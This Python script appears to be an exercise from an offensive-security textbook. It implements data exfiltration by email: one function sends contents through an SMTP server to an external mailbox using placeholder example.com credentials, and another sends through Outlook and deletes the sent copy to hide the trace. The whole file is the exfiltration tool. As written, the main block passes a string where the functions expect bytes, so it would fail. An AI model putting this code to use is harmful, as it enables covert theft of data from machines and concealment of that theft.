#!/usr/bin/env python
# encoding: utf-8
"""
@file: email_exfil.py
@time: 2022/5/26 19:07
@project: black-hat-python-2ed
@desc: P169 基于电子邮件的数据渗透
"""

# 指定SMTP服务器地址、连接的端口、用户名和密码
import smtplib
import time

import win32com.client

smtp_server = "smtp.example.com"
smtp_port = 587
smtp_acct = "tim@example.com"
smtp_password = "seKret"
tgt_accts = ["tim@elsewhere.com"]


def plain_email(subject, contents):
    # 生成一条消息
    message = f"Subject: {subject}\nFrom {smtp_acct}\n"
    message += f"To: {tgt_accts}\n\n{contents.decode()}"
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    # 连接服务器，登录邮箱
    server.login(smtp_acct, smtp_password)

    # 传入账号、收件箱地址和邮件消息
    server.sendmail(smtp_acct, tgt_accts, message)
    time.sleep(1)
    server.quit()


def outlook(subject, contents):
    # 创建一个Outlook应用实例
    outlook = win32com.client.Dispatch("Outlook.Application")
    message = outlook.CreateItem(0)
    # 发送邮件后立即删除
    message.DeleteAfterSubmit = True
    message.Subject = subject
    message.Body = contents.decode()
    message.To = tgt_accts[0]
    # 发送邮件
    message.Send()


if __name__ == '__main__':
    plain_email('test2 message', 'attack at dawn.')
